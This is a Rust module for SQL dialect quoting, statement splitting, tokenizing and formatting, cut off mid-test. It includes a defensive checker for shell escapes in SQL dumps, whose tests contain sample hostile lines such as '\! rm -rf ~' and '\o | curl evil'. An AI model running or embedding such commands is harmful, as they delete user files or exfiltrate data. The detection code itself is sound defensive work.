//! Dialect-aware SQL text handling: quoting, statement splitting, keywords.

#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash)]
pub enum Dialect {
    Postgres,
    MySql,
    Sqlite,
    /// Microsoft SQL Server (T-SQL).
    SqlServer,
}

impl Dialect {
    pub fn quote_ident(self, ident: &str) -> String {
        match self {
            Dialect::MySql => format!("`{}`", ident.replace('`', "``")),
            Dialect::SqlServer => format!("[{}]", ident.replace(']', "]]")),
            _ => format!("\"{}\"", ident.replace('"', "\"\"")),
        }
    }

    /// String literal. MySQL treats backslash as an escape by default.
    pub fn quote_literal(self, s: &str) -> String {
        match self {
            Dialect::MySql => format!("'{}'", s.replace('\\', "\\\\").replace('\'', "''")),
            // N'' keeps non-ASCII text intact in nvarchar columns.
            Dialect::SqlServer => format!("N'{}'", s.replace('\'', "''")),
            _ => format!("'{}'", s.replace('\'', "''")),
        }
    }

    /// `schema.name` with each part quoted.
    pub fn qualified(self, schema: Option<&str>, name: &str) -> String {
        match schema {
            Some(s) if !s.is_empty() => format!("{}.{}", self.quote_ident(s), self.quote_ident(name)),
            _ => self.quote_ident(name),
        }
    }

    pub fn name(self) -> &'static str {
        match self {
            Dialect::Postgres => "PostgreSQL",
            Dialect::MySql => "MySQL",
            Dialect::Sqlite => "SQLite",
            Dialect::SqlServer => "SQL Server",
        }
    }

    pub fn keywords(self) -> &'static [&'static str] {
        COMMON_KEYWORDS
    }

    pub fn extra_keywords(self) -> &'static [&'static str] {
        match self {
            Dialect::Postgres => PG_KEYWORDS,
            Dialect::MySql => MYSQL_KEYWORDS,
            Dialect::Sqlite => SQLITE_KEYWORDS,
            Dialect::SqlServer => TSQL_KEYWORDS,
        }
    }

    pub fn is_keyword(self, word: &str) -> bool {
        let up = word.to_ascii_uppercase();
        COMMON_KEYWORDS.binary_search(&up.as_str()).is_ok() || self.extra_keywords().contains(&up.as_str())
    }
}

/// Byte range of one statement inside a script.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Span {
    pub start: usize,
    pub end: usize,
}

/// Split a script into statements, honouring quotes, comments, PostgreSQL
/// dollar quoting, MySQL `DELIMITER` and `BEGIN … END` bodies in CREATE
/// TRIGGER/PROCEDURE/FUNCTION statements.
pub fn split_statements(dialect: Dialect, sql: &str) -> Vec<Span> {
    let b = sql.as_bytes();
    let n = b.len();
    let mut out = Vec::new();
    let mut i = 0;
    let mut start = 0;
    let mut delimiter: Vec<u8> = b";".to_vec();
    let mut depth: i32 = 0;
    // Track whether the current statement starts with CREATE, which enables
    // BEGIN … END block tracking.
    let mut first_word: Option<String> = None;

    let push = |out: &mut Vec<Span>, s: usize, e: usize| {
        let text = &sql[s..e];
        let trimmed_start = s + (text.len() - text.trim_start().len());
        let trimmed_end = e - (text.len() - text.trim_end().len());
        if trimmed_end > trimmed_start && !is_only_comments(&sql[trimmed_start..trimmed_end]) {
            out.push(Span { start: trimmed_start, end: trimmed_end });
        }
    };

    while i < n {
        let c = b[i];
        // MySQL client DELIMITER directive at line start.
        if dialect == Dialect::MySql && depth == 0 && at_line_start(b, i) && starts_with_ci(&b[i..], b"DELIMITER") {
            let line_end = b[i..].iter().position(|&x| x == b'\n').map(|p| i + p).unwrap_or(n);
            let arg = sql[i + 9..line_end].trim();
            if !arg.is_empty() {
                push(&mut out, start, i);
                delimiter = arg.as_bytes().to_vec();
                i = line_end;
                start = i;
                first_word = None;
                continue;
            }
        }
        if dialect == Dialect::SqlServer && depth == 0 && (c == b'G' || c == b'g') && at_line_start(b, i) {
            let line_end = b[i..].iter().position(|&x| x == b'\n').map(|p| i + p).unwrap_or(n);
            if sql[i..line_end].trim().eq_ignore_ascii_case("GO") {
                push(&mut out, start, i);
                i = line_end;
                start = i;
                first_word = None;
                continue;
            }
        }
        match c {
            b'[' if dialect == Dialect::SqlServer => {
                i = b[i..].iter().position(|&x| x == b']').map(|p| i + p + 1).unwrap_or(n);
                continue;
            }
            b'\'' | b'"' | b'`' => {
                i = skip_quoted(b, i, c, dialect);
                continue;
            }
            b'-' if i + 1 < n && b[i + 1] == b'-' => {
                i = skip_line(b, i);
                continue;
            }
            b'#' if dialect == Dialect::MySql => {
                i = skip_line(b, i);
                continue;
            }
            b'/' if i + 1 < n && b[i + 1] == b'*' => {
                i = skip_block_comment(b, i, dialect == Dialect::Postgres);
                continue;
            }
            b'$' if dialect == Dialect::Postgres => {
                if let Some(end) = skip_dollar_quote(sql, i) {
                    i = end;
                    continue;
                }
            }
            _ => {}
        }
        if c.is_ascii_alphabetic() || c == b'_' {
            let ws = i;
            while i < n && (b[i].is_ascii_alphanumeric() || b[i] == b'_' || b[i] == b'$') {
                i += 1;
            }
            let word = sql[ws..i].to_ascii_uppercase();
            if first_word.is_none() {
                first_word = Some(word.clone());
            }
            if first_word.as_deref() == Some("CREATE") {
                match word.as_str() {
                    "BEGIN" => {
                        let next = next_word(sql, i);
                        if !matches!(next.as_deref(), Some("TRANSACTION" | "WORK" | "DEFERRED" | "IMMEDIATE" | "EXCLUSIVE")) {
                            depth += 1;
                        }
                    }
                    "CASE" if depth > 0 => depth += 1,
                    "END" if depth > 0 => {
                        let next = next_word(sql, i);
                        if !matches!(next.as_deref(), Some("IF" | "LOOP" | "WHILE" | "REPEAT")) {
                            depth -= 1;
                        }
                    }
                    _ => {}
                }
            }
            continue;
        }
        if depth == 0 && b[i..].starts_with(&delimiter) {
            push(&mut out, start, i);
            i += delimiter.len();
            start = i;
            first_word = None;
            continue;
        }
        i += 1;
    }
    push(&mut out, start, n);
    out
}

/// Statement containing the cursor (byte offset), or the closest one before.
pub fn statement_at(spans: &[Span], cursor: usize) -> Option<Span> {
    spans.iter().copied().find(|s| cursor >= s.start && cursor <= s.end + 1).or_else(|| spans.iter().copied().rfind(|s| s.end <= cursor)).or_else(|| spans.first().copied())
}

fn is_only_comments(s: &str) -> bool {
    let mut rest = s.trim();
    loop {
        if rest.is_empty() {
            return true;
        }
        if rest.starts_with("--") || rest.starts_with('#') {
            rest = rest.split_once('\n').map(|x| x.1).unwrap_or("").trim_start();
        } else if rest.starts_with("/*") {
            match rest.find("*/") {
                Some(p) => rest = rest[p + 2..].trim_start(),
                None => return true,
            }
        } else {
            return false;
        }
    }
}

fn at_line_start(b: &[u8], i: usize) -> bool {
    let mut j = i;
    while j > 0 {
        j -= 1;
        match b[j] {
            b'\n' => return true,
            b' ' | b'\t' | b'\r' => continue,
            _ => return false,
        }
    }
    true
}

fn starts_with_ci(hay: &[u8], needle: &[u8]) -> bool {
    hay.len() > needle.len() && hay[..needle.len()].eq_ignore_ascii_case(needle) && (hay[needle.len()] == b' ' || hay[needle.len()] == b'\t')
}

fn next_word(sql: &str, from: usize) -> Option<String> {
    let rest = sql[from..].trim_start();
    let w: String = rest.chars().take_while(|c| c.is_ascii_alphanumeric() || *c == '_').collect();
    if w.is_empty() { None } else { Some(w.to_ascii_uppercase()) }
}

fn skip_quoted(b: &[u8], start: usize, q: u8, dialect: Dialect) -> usize {
    let n = b.len();
    let mut i = start + 1;
    let backslash_escapes = dialect == Dialect::MySql && q != b'`';
    while i < n {
        let c = b[i];
        if backslash_escapes && c == b'\\' {
            i += 2;
            continue;
        }
        if c == q {
            if i + 1 < n && b[i + 1] == q {
                i += 2;
                continue;
            }
            return i + 1;
        }
        i += 1;
    }
    n
}

fn skip_line(b: &[u8], i: usize) -> usize {
    b[i..].iter().position(|&x| x == b'\n').map(|p| i + p + 1).unwrap_or(b.len())
}

fn skip_block_comment(b: &[u8], start: usize, nested: bool) -> usize {
    let n = b.len();
    let mut depth = 0;
    let mut i = start;
    while i + 1 < n {
        if b[i] == b'/' && b[i + 1] == b'*' {
            depth += 1;
            i += 2;
            if !nested && depth > 1 {
                depth = 1;
            }
            continue;
        }
        if b[i] == b'*' && b[i + 1] == b'/' {
            depth -= 1;
            i += 2;
            if depth == 0 {
                return i;
            }
            continue;
        }
        i += 1;
    }
    n
}

/// PostgreSQL `$tag$ … $tag$`. Returns the index after the closing tag.
fn skip_dollar_quote(sql: &str, start: usize) -> Option<usize> {
    let b = sql.as_bytes();
    let mut j = start + 1;
    while j < b.len() && (b[j].is_ascii_alphanumeric() || b[j] == b'_') {
        j += 1;
    }
    if j >= b.len() || b[j] != b'$' {
        return None;
    }
    // `$1` is a parameter, not a tag.
    if j > start + 1 && b[start + 1].is_ascii_digit() {
        return None;
    }
    let tag = &sql[start..=j];
    let body_start = j + 1;
    sql[body_start..].find(tag).map(|p| body_start + p + tag.len()).or(Some(b.len()))
}

/// Token classes for syntax highlighting.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum TokenKind {
    Keyword,
    Ident,
    QuotedIdent,
    String,
    Number,
    Comment,
    Operator,
    Param,
    Whitespace,
    Other,
}

/// Lightweight tokenizer used by the editor; never fails, never allocates
/// per character.
pub fn tokenize(dialect: Dialect, sql: &str) -> Vec<(TokenKind, Span)> {
    let b = sql.as_bytes();
    let n = b.len();
    let mut out = Vec::with_capacity(n / 3);
    let mut i = 0;
    while i < n {
        let c = b[i];
        let start = i;
        let kind = match c {
            b' ' | b'\t' | b'\r' | b'\n' => {
                while i < n && matches!(b[i], b' ' | b'\t' | b'\r' | b'\n') {
                    i += 1;
                }
                TokenKind::Whitespace
            }
            b'\'' => {
                i = skip_quoted(b, i, c, dialect);
                TokenKind::String
            }
            b'"' if dialect == Dialect::MySql => {
                i = skip_quoted(b, i, c, dialect);
                TokenKind::String
            }
            b'"' | b'`' => {
                i = skip_quoted(b, i, c, dialect);
                TokenKind::QuotedIdent
            }
            b'[' if dialect == Dialect::SqlServer => {
                i = b[i..].iter().position(|&x| x == b']').map(|p| i + p + 1).unwrap_or(n);
                TokenKind::QuotedIdent
            }
            b'@' if dialect == Dialect::SqlServer && i + 1 < n && (b[i + 1].is_ascii_alphabetic() || b[i + 1] == b'@' || b[i + 1] == b'_') => {
                i += 1;
                while i < n && (b[i].is_ascii_alphanumeric() || b[i] == b'_' || b[i] == b'@') {
                    i += 1;
                }
                TokenKind::Param
            }
            b'-' if i + 1 < n && b[i + 1] == b'-' => {
                i = b[i..].iter().position(|&x| x == b'\n').map(|p| i + p).unwrap_or(n);
                TokenKind::Comment
            }
            b'#' if dialect == Dialect::MySql => {
                i = b[i..].iter().position(|&x| x == b'\n').map(|p| i + p).unwrap_or(n);
                TokenKind::Comment
            }
            b'/' if i + 1 < n && b[i + 1] == b'*' => {
                i = skip_block_comment(b, i, dialect == Dialect::Postgres);
                TokenKind::Comment
            }
            b'$' if dialect == Dialect::Postgres => {
                if let Some(end) = skip_dollar_quote(sql, i) {
                    i = end;
                    TokenKind::String
                } else {
                    i += 1;
                    while i < n && b[i].is_ascii_digit() {
                        i += 1;
                    }
                    TokenKind::Param
                }
            }
            b'?' => {
                i += 1;
                TokenKind::Param
            }
            b':' if i + 1 < n && b[i + 1].is_ascii_alphabetic() => {
                i += 1;
                while i < n && (b[i].is_ascii_alphanumeric() || b[i] == b'_') {
                    i += 1;
                }
                TokenKind::Param
            }
            b'0'..=b'9' => {
                while i < n && (b[i].is_ascii_alphanumeric() || b[i] == b'.') {
                    i += 1;
                }
                TokenKind::Number
            }
            c if c.is_ascii_alphabetic() || c == b'_' || c >= 0x80 => {
                while i < n && (b[i].is_ascii_alphanumeric() || b[i] == b'_' || b[i] == b'$' || b[i] >= 0x80) {
                    i += 1;
                }
                if dialect.is_keyword(&sql[start..i]) { TokenKind::Keyword } else { TokenKind::Ident }
            }
            b'(' | b')' | b',' | b';' | b'.' | b'=' | b'<' | b'>' | b'+' | b'-' | b'*' | b'/' | b'%' | b'|' | b'!' | b'~' | b'^' | b'&' | b'@' | b':' | b'[' | b']' => {
                i += 1;
                TokenKind::Operator
            }
            _ => {
                i += 1;
                TokenKind::Other
            }
        };
        // Keep spans on char boundaries.
        while i < n && !sql.is_char_boundary(i) {
            i += 1;
        }
        out.push((kind, Span { start, end: i.min(n) }));
    }
    out
}

/// First keyword of a statement, upper-cased (`SELECT`, `WITH`, …).
pub fn leading_keyword(sql: &str) -> String {
    let mut rest = sql.trim_start();
    loop {
        if rest.starts_with("--") {
            rest = rest.split_once('\n').map(|x| x.1).unwrap_or("").trim_start();
        } else if rest.starts_with("/*") {
            rest = rest.split_once("*/").map(|x| x.1).unwrap_or("").trim_start();
        } else {
            break;
        }
    }
    rest.trim_start_matches('(').chars().take_while(|c| c.is_ascii_alphabetic()).collect::<String>().to_ascii_uppercase()
}

/// Sorted for binary search.
const COMMON_KEYWORDS: &[&str] = &[
    "ADD",
    "ALL",
    "ALTER",
    "ANALYZE",
    "AND",
    "ANY",
    "AS",
    "ASC",
    "BEGIN",
    "BETWEEN",
    "BY",
    "CASCADE",
    "CASE",
    "CAST",
    "CHECK",
    "COLLATE",
    "COLUMN",
    "COMMIT",
    "CONSTRAINT",
    "CREATE",
    "CROSS",
    "CURRENT",
    "CURRENT_DATE",
    "CURRENT_TIME",
    "CURRENT_TIMESTAMP",
    "DATABASE",
    "DEFAULT",
    "DELETE",
    "DESC",
    "DISTINCT",
    "DO",
    "DROP",
    "ELSE",
    "END",
    "ESCAPE",
    "EXCEPT",
    "EXISTS",
    "EXPLAIN",
    "FALSE",
    "FETCH",
    "FILTER",
    "FIRST",
    "FOR",
    "FOREIGN",
    "FROM",
    "FULL",
    "FUNCTION",
    "GRANT",
    "GROUP",
    "HAVING",
    "IF",
    "IN",
    "INDEX",
    "INNER",
    "INSERT",
    "INTERSECT",
    "INTO",
    "IS",
    "JOIN",
    "KEY",
    "LAST",
    "LEFT",
    "LIKE",
    "LIMIT",
    "NATURAL",
    "NOT",
    "NULL",
    "NULLS",
    "OFFSET",
    "ON",
    "OR",
    "ORDER",
    "OUTER",
    "OVER",
    "PARTITION",
    "PRIMARY",
    "PROCEDURE",
    "RECURSIVE",
    "REFERENCES",
    "RENAME",
    "REPLACE",
    "RETURNING",
    "REVOKE",
    "RIGHT",
    "ROLLBACK",
    "ROW",
    "ROWS",
    "SAVEPOINT",
    "SCHEMA",
    "SELECT",
    "SET",
    "SHOW",
    "TABLE",
    "TEMP",
    "TEMPORARY",
    "THEN",
    "TO",
    "TRANSACTION",
    "TRIGGER",
    "TRUE",
    "TRUNCATE",
    "UNION",
    "UNIQUE",
    "UPDATE",
    "USING",
    "VALUES",
    "VIEW",
    "WHEN",
    "WHERE",
    "WINDOW",
    "WITH",
];

const PG_KEYWORDS: &[&str] = &[
    "ILIKE",
    "SIMILAR",
    "LATERAL",
    "MATERIALIZED",
    "SEQUENCE",
    "EXTENSION",
    "OWNER",
    "VACUUM",
    "REINDEX",
    "CLUSTER",
    "LISTEN",
    "NOTIFY",
    "COPY",
    "CONFLICT",
    "NOTHING",
    "RETURNS",
    "LANGUAGE",
    "IMMUTABLE",
    "STABLE",
    "VOLATILE",
    "SECURITY",
    "DEFINER",
    "INVOKER",
    "ROLE",
    "USER",
    "PASSWORD",
    "LOGIN",
    "SUPERUSER",
    "INHERIT",
    "TABLESPACE",
    "DOMAIN",
    "TYPE",
    "ENUM",
    "CONCURRENTLY",
    "ONLY",
    "VERBOSE",
    "BUFFERS",
    "FORMAT",
    "JSON",
    "SERIAL",
    "BIGSERIAL",
    "INTEGER",
    "BIGINT",
    "SMALLINT",
    "TEXT",
    "VARCHAR",
    "BOOLEAN",
    "NUMERIC",
    "TIMESTAMP",
    "TIMESTAMPTZ",
    "INTERVAL",
    "JSONB",
    "UUID",
    "BYTEA",
    "ARRAY",
    "GENERATED",
    "ALWAYS",
    "IDENTITY",
    "DEFERRABLE",
    "INITIALLY",
    "DEFERRED",
    "IMMEDIATE",
    "ATOMIC",
];

const MYSQL_KEYWORDS: &[&str] = &[
    "AUTO_INCREMENT",
    "ENGINE",
    "CHARSET",
    "CHARACTER",
    "UNSIGNED",
    "ZEROFILL",
    "DELIMITER",
    "DUPLICATE",
    "IGNORE",
    "STRAIGHT_JOIN",
    "SQL_CALC_FOUND_ROWS",
    "DATABASES",
    "TABLES",
    "COLUMNS",
    "PROCESSLIST",
    "STATUS",
    "VARIABLES",
    "KILL",
    "QUERY",
    "USE",
    "DESCRIBE",
    "EVENT",
    "DEFINER",
    "USER",
    "IDENTIFIED",
    "PRIVILEGES",
    "FLUSH",
    "LOCK",
    "UNLOCK",
    "REGEXP",
    "RLIKE",
    "DIV",
    "MOD",
    "XOR",
    "INT",
    "INTEGER",
    "BIGINT",
    "TINYINT",
    "VARCHAR",
    "TEXT",
    "LONGTEXT",
    "DATETIME",
    "TIMESTAMP",
    "DECIMAL",
    "JSON",
    "BLOB",
    "ENUM",
    "DECLARE",
    "CURSOR",
    "HANDLER",
    "LOOP",
    "LEAVE",
    "ITERATE",
    "REPEAT",
    "UNTIL",
    "WHILE",
    "CALL",
];

const TSQL_KEYWORDS: &[&str] = &[
    "TOP",
    "NOLOCK",
    "IDENTITY",
    "NVARCHAR",
    "VARCHAR",
    "NCHAR",
    "INT",
    "BIGINT",
    "BIT",
    "DATETIME2",
    "DATETIMEOFFSET",
    "UNIQUEIDENTIFIER",
    "MONEY",
    "DECIMAL",
    "EXEC",
    "EXECUTE",
    "DECLARE",
    "PRINT",
    "GO",
    "USE",
    "MERGE",
    "OUTPUT",
    "INSERTED",
    "DELETED",
    "TRY",
    "CATCH",
    "THROW",
    "RAISERROR",
    "TRAN",
    "NOCOUNT",
    "OFFSET",
    "FETCH",
    "NEXT",
    "ONLY",
    "APPLY",
    "PIVOT",
    "UNPIVOT",
    "WAITFOR",
    "CLUSTERED",
    "NONCLUSTERED",
    "INCLUDE",
    "LOGIN",
    "SCHEMA",
    "SYNONYM",
];

const SQLITE_KEYWORDS: &[&str] = &[
    "PRAGMA",
    "VACUUM",
    "ATTACH",
    "DETACH",
    "AUTOINCREMENT",
    "WITHOUT",
    "ROWID",
    "STRICT",
    "GLOB",
    "REGEXP",
    "CONFLICT",
    "ABORT",
    "FAIL",
    "IGNORE",
    "INSTEAD",
    "VIRTUAL",
    "REINDEX",
    "INTEGER",
    "TEXT",
    "REAL",
    "BLOB",
    "NUMERIC",
    "UPSERT",
    "NOTHING",
    "DEFERRED",
    "IMMEDIATE",
    "EXCLUSIVE",
    "QUERY",
    "PLAN",
];

#[cfg(test)]
mod tests {
    use super::*;

    fn texts(d: Dialect, sql: &str) -> Vec<String> {
        split_statements(d, sql).iter().map(|s| sql[s.start..s.end].to_string()).collect()
    }

    #[test]
    fn keywords_sorted() {
        let mut v = COMMON_KEYWORDS.to_vec();
        v.sort();
        assert_eq!(v, COMMON_KEYWORDS);
    }

    #[test]
    fn splits_simple_and_strings() {
        let s = texts(Dialect::Postgres, "select ';'; select 2 -- c;\n; /* ; */ select 3");
        assert_eq!(s, vec!["select ';'", "select 2 -- c;", "/* ; */ select 3"]);
    }

    #[test]
    fn pg_dollar_quotes() {
        let sql = "create function f() returns int as $body$ begin; return 1; end $body$ language plpgsql; select 1";
        let s = texts(Dialect::Postgres, sql);
        assert_eq!(s.len(), 2);
        assert!(s[0].ends_with("plpgsql"));
    }

    #[test]
    fn sqlite_trigger_body() {
        let sql = "CREATE TRIGGER t AFTER INSERT ON a BEGIN UPDATE b SET x = CASE WHEN 1 THEN 2 END; DELETE FROM c; END; SELECT 1;";
        let s = texts(Dialect::Sqlite, sql);
        assert_eq!(s.len(), 2, "{s:?}");
        assert_eq!(s[1], "SELECT 1");
    }

    #[test]
    fn begin_transaction_is_statement() {
        let s = texts(Dialect::Sqlite, "BEGIN; INSERT INTO t VALUES (1); COMMIT;");
        assert_eq!(s.len(), 3);
    }

    #[test]
    fn mysql_delimiter() {
        let sql = "DELIMITER //\nCREATE PROCEDURE p() BEGIN SELECT 1; IF 1 THEN SELECT 2; END IF; END //\nDELIMITER ;\nSELECT 3;";
        let s = texts(Dialect::MySql, sql);
        assert_eq!(s.len(), 2, "{s:?}");
        assert_eq!(s[1], "SELECT 3");
    }

    #[test]
    fn mysql_procedure_without_delimiter() {
        let sql = "CREATE PROCEDURE p() BEGIN SELECT 1; IF 1 THEN SELECT 2; END IF; END; SELECT 3";
        let s = texts(Dialect::MySql, sql);
        assert_eq!(s.len(), 2, "{s:?}");
    }

    #[test]
    fn tsql_go_and_brackets() {
        let sql = "SELECT [a;b] FROM t\nGO\nCREATE PROCEDURE p AS BEGIN SELECT 1; SELECT 2; END\ngo\nSELECT 3";
        let s = texts(Dialect::SqlServer, sql);
        assert_eq!(s.len(), 3, "{s:?}");
        assert_eq!(s[0], "SELECT [a;b] FROM t");
        assert_eq!(Dialect::SqlServer.quote_ident("a]b"), "[a]]b]");
    }

    #[test]
    fn cursor_lookup() {
        let sql = "select 1;\nselect 2;";
        let spans = split_statements(Dialect::Postgres, sql);
        assert_eq!(&sql[statement_at(&spans, 12).unwrap().start..statement_at(&spans, 12).unwrap().end], "select 2");
        assert_eq!(&sql[statement_at(&spans, 3).unwrap().start..statement_at(&spans, 3).unwrap().end], "select 1");
    }

    #[test]
    fn leading() {
        assert_eq!(leading_keyword("  -- x\n /* y */ (select 1)"), "SELECT");
    }
}

/// Which command-line client will read a plain SQL dump.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum DumpClient {
    Psql,
    Mysql,
}

/// Find client commands in a plain SQL dump that would run programs on this
/// machine (`\!`, piped output, `\copy … program`, mysql `system`). Restoring
/// such a file runs them with the user's rights, so callers refuse it.
/// Returns the 1-based line number and the line.
pub fn dangerous_dump_line(text: &str, client: DumpClient) -> Option<(usize, String)> {
    let mut in_copy = false;
    for (i, raw) in text.lines().enumerate() {
        let line = raw.trim_start();
        match client {
            DumpClient::Psql => {
                if in_copy {
                    // COPY … FROM stdin data ends with a lone "\.".
                    if raw == "\\." {
                        in_copy = false;
                    }
                    continue;
                }
                let upper = line.to_ascii_uppercase();
                if upper.starts_with("COPY ") && upper.trim_end().ends_with("FROM STDIN;") {
                    in_copy = true;
                    continue;
                }
                if let Some(meta) = line.strip_prefix('\\') {
                    let cmd: String = meta.chars().take_while(|c| !c.is_whitespace()).collect();
                    let rest = meta[cmd.len()..].trim_start();
                    let shell = cmd.starts_with('!')
                        || matches!(cmd.as_str(), "o" | "out" | "g" | "gx" | "w" | "write") && rest.starts_with('|')
                        || matches!(cmd.as_str(), "copy") && rest.to_ascii_lowercase().contains(" program ")
                        || matches!(cmd.as_str(), "setenv" | "i" | "include" | "ir" | "include_relative" | "lo_export" | "lo_import");
                    if shell {
                        return Some((i + 1, raw.chars().take(200).collect()));
                    }
                }
            }
            DumpClient::Mysql => {
                let lower = line.to_ascii_lowercase();
                if line.starts_with("\\!") || lower.starts_with("system ") || lower.starts_with("\\. ") || lower.starts_with("source ") || lower.starts_with("tee ") || lower.starts_with("pager ") {
                    return Some((i + 1, raw.chars().take(200).collect()));
                }
            }
        }
    }
    None
}

#[cfg(test)]
mod dump_tests {
    use super::*;

    #[test]
    fn finds_shell_escapes() {
        let ok = "SET x = 1;\nCOPY t (a) FROM stdin;\n\\! not a command, data\n\\.\n\\connect db\nSELECT 1;\n";
        assert_eq!(dangerous_dump_line(ok, DumpClient::Psql), None);
        assert_eq!(dangerous_dump_line("SELECT 1;\n\\! rm -rf ~\n", DumpClient::Psql).map(|x| x.0), Some(2));
        assert!(dangerous_dump_line("\\o | curl evil", DumpClient::Psql).is_some());
        assert!(dangerous_dump_line("\\copy t to program 'sh'", DumpClient::Psql).is_some());
        assert!(dangerous_dump_line("INSERT INTO t VALUES ('system x');\nsystem touch /tmp/x\n", DumpClient::Mysql).is_some());
        assert_eq!(dangerous_dump_line("INSERT INTO t VALUES ('system');\n", DumpClient::Mysql), None);
    }
}

/// Reformat SQL for reading: upper-case keywords, one clause per line,
/// one select-list item per line, AND/OR conditions on their own lines,
/// subqueries indented. Strings, quoted names and comments are kept as
/// written. Formatting never changes what the statement does.
pub fn format_sql(dialect: Dialect, sql: &str) -> String {
    const CLAUSES: [&str; 22] = [
        "SELECT",
        "FROM",
        "WHERE",
        "HAVING",
        "LIMIT",
        "OFFSET",
        "UNION",
        "INTERSECT",
        "EXCEPT",
        "VALUES",
        "SET",
        "RETURNING",
        "WITH",
        "INSERT",
        "UPDATE",
        "DELETE",
        "JOIN",
        "LEFT",
        "RIGHT",
        "INNER",
        "FULL",
        "CROSS",
    ];
    let toks: Vec<(TokenKind, Span)> = tokenize(dialect, sql).into_iter().filter(|(k, _)| *k != TokenKind::Whitespace).collect();
    let text = |i: usize| &sql[toks[i].1.start..toks[i].1.end];
    let upper = |i: usize| text(i).to_ascii_uppercase();
    let mut out = String::with_capacity(sql.len() + sql.len() / 4);
    let mut depth: usize = 0;
    // Per paren level: does it hold a subquery, and which clause is current?
    let mut sub: Vec<bool> = vec![true];
    let mut clause: Vec<String> = vec![String::new()];
    let newline = |out: &mut String, indent: usize| {
        while out.ends_with(' ') {
            out.pop();
        }
        if !out.is_empty() && !out.ends_with('\n') {
            out.push('\n');
        }
        out.push_str(&"  ".repeat(indent));
    };
    let mut prev_kw = String::new();
    for i in 0..toks.len() {
        let (kind, _) = toks[i];
        let t = text(i);
        let u = upper(i);
        let in_sub = *sub.last().unwrap_or(&true);
        let base = sub.iter().filter(|s| **s).count().saturating_sub(1);
        match kind {
            TokenKind::Comment => {
                if !out.is_empty() && !out.ends_with('\n') && !out.ends_with(' ') {
                    out.push(' ');
                }
                out.push_str(t.trim_end());
                if t.starts_with("--") || t.starts_with('#') {
                    newline(&mut out, base + 1);
                }
                continue;
            }
            TokenKind::Keyword if in_sub => {
                let joins_after_modifier = u == "JOIN" && matches!(prev_kw.as_str(), "LEFT" | "RIGHT" | "INNER" | "FULL" | "CROSS" | "OUTER" | "NATURAL");
                let is_clause = (CLAUSES.contains(&u.as_str()) && !joins_after_modifier)
                    || ((u == "GROUP" || u == "ORDER") && i + 1 < toks.len() && upper(i + 1) == "BY")
                    || (u == "INTO" && prev_kw != "INSERT")
                    || u == "NATURAL";
                // ON CONFLICT / DELETE in a trigger or rule clause stay inline after ON.
                let after_on = prev_kw == "ON" || prev_kw == "DO";
                if is_clause && !after_on && !(u == "SET" && prev_kw == "UPDATE" && false) {
                    newline(&mut out, base);
                    out.push_str(&u);
                    out.push(' ');
                    if let Some(c) = clause.last_mut() {
                        *c = if u == "ORDER" || u == "GROUP" { format!("{u} BY") } else { u.clone() };
                    }
                    prev_kw = u;
                    continue;
                }
                if (u == "AND" || u == "OR") && matches!(clause.last().map(String::as_str), Some("WHERE" | "HAVING" | "JOIN" | "LEFT" | "RIGHT" | "INNER" | "FULL" | "CROSS")) {
                    newline(&mut out, base + 1);
                    out.push_str(&u);
                    out.push(' ');
                    prev_kw = u;
                    continue;
                }
                if !out.is_empty() && !out.ends_with(['\n', ' ', '(', '.']) {
                    out.push(' ');
                }
                out.push_str(&u);
                out.push(' ');
                prev_kw = u;
                continue;
            }
            TokenKind::Keyword => {
                if !out.is_empty() && !out.ends_with(['\n', ' ', '(', '.']) {
                    out.push(' ');
                }
                out.push_str(&u);
                out.push(' ');
                prev_kw = u;
                continue;
            }
            _ => {}
        }
        match t {
            "(" => {
                // A paren opening a subquery indents what follows.
                let opens_sub = i + 1 < toks.len() && matches!(upper(i + 1).as_str(), "SELECT" | "WITH");
                // `count(` hugs its function name; `IN (`, `VALUES (` keep a space.
                let after_kw = i > 0
                    && toks[i - 1].0 == TokenKind::Keyword
                    && !matches!(
                        upper(i - 1).as_str(),
                        "COUNT" | "SUM" | "MIN" | "MAX" | "AVG" | "COALESCE" | "CAST" | "ROUND" | "LOWER" | "UPPER" | "NOW" | "EXISTS" | "SUBSTRING" | "TRIM" | "REPLACE" | "LENGTH" | "CONCAT"
                    );
                if after_kw {
                    if !out.ends_with([' ', '\n', '(']) {
                        out.push(' ');
                    }
                } else {
                    while out.ends_with(' ') {
                        out.pop();
                    }
                }
                out.push('(');
                depth += 1;
                sub.push(opens_sub);
                clause.push(String::new());
            }
            ")" => {
                let was_sub = sub.pop().unwrap_or(false);
                clause.pop();
                depth = depth.saturating_sub(1);
                if was_sub {
                    newline(&mut out, sub.iter().filter(|s| **s).count().saturating_sub(1) + 1);
                    while out.ends_with(' ') && out.ends_with("  ") {
                        out.pop();
                        out.pop();
                    }
                } else {
                    while out.ends_with(' ') {
                        out.pop();
                    }
                }
                out.push_str(") ");
            }
            "," => {
                while out.ends_with(' ') {
                    out.pop();
                }
                out.push(',');
                let list = matches!(clause.last().map(String::as_str), Some("SELECT" | "GROUP BY" | "ORDER BY" | "SET" | "RETURNING"));
                if in_sub && list {
                    newline(&mut out, base + 1);
                } else {
                    out.push(' ');
                }
            }
            ";" => {
                while out.ends_with(' ') {
                    out.pop();
                }
                out.push_str(";\n\n");
                depth = 0;
                sub = vec![true];
                clause = vec![String::new()];
                prev_kw.clear();
            }
            "." => {
                while out.ends_with(' ') {
                    out.pop();
                }
                out.push('.');
            }
            ":" if out.ends_with(':') => out.push(':'),
            _ => {
                if out.ends_with(':') && kind == TokenKind::Ident && out.ends_with("::") {
                    out.push_str(t);
                } else {
                    if !out.is_empty() && !out.ends_with(['\n', ' ', '(', '.']) {
                        out.push(' ');
                    }
                    out.push_str(t);
                    if !(kind == TokenKind::Operator && t == ":") {
                        out.push(' ');
                    }
                }
            }
        }
        let _ = depth;
        // Only keywords that directly precede a clause should affect it.
        prev_kw.clear();
    }
    let lines: Vec<String> = out.lines().map(|l| l.trim_end().to_string()).collect();
    let mut s = lines.join("\n").trim().to_string();
    while s.contains("\n\n\n") {
        s = s.replace("\n\n\n", "\n\n");
    }
    s
}

#[cfg(test)]
mod format_tests {
    use super::*;

    #[test]
    fn formats_a_select() {
        let got = format_sql(
            Dialect::Postgres,
            "select c.country, count(*) as orders from sales.orders o join sales.customers c on c.id = o.customer_id where o.status = 'shipped' and o.amount > 10 group by 1 order by orders desc;",
        );
